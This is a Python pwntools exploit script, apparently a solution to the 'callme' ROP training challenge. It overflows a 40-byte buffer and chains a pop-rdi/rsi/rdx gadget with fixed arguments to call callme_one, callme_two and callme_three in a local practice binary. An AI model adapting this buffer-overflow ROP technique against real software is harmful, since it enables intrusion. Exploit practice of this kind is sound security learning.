from pwn import *

context.clear(arch='amd64')
context.terminal = ['urxvt', '-e']

binary = ELF('./callme')
p = process('./callme')

rop = ROP(binary)

pop_regs = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx',  'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

callme_one = binary.plt['callme_one']
callme_two = binary.plt['callme_two']
callme_three = binary.plt['callme_three']

deadbeef = 0xdeadbeefdeadbeef
cafebabe = 0xcafebabecafebabe
doodfood = 0xd00df00dd00df00d

bof_len = 40

rop_chain = b'A' * bof_len

rop_chain += p64(pop_regs) # pop rdi; pop rsi; pop rdx; ret;
rop_chain += p64(deadbeef) 
rop_chain += p64(cafebabe) 
rop_chain += p64(doodfood) 
rop_chain += p64(ret) # ret;
rop_chain += p64(callme_one) # callme_one@plt

rop_chain += p64(pop_regs)
rop_chain += p64(deadbeef)
rop_chain += p64(cafebabe)
rop_chain += p64(doodfood)
rop_chain += p64(ret)
rop_chain += p64(callme_two)

rop_chain += p64(pop_regs)
rop_chain += p64(deadbeef)
rop_chain += p64(cafebabe)
rop_chain += p64(doodfood)
rop_chain += p64(ret)
rop_chain += p64(callme_three)

#gdb.attach(p, gdbscript="b *pwnme")

p.sendline(rop_chain)
p.interactive()

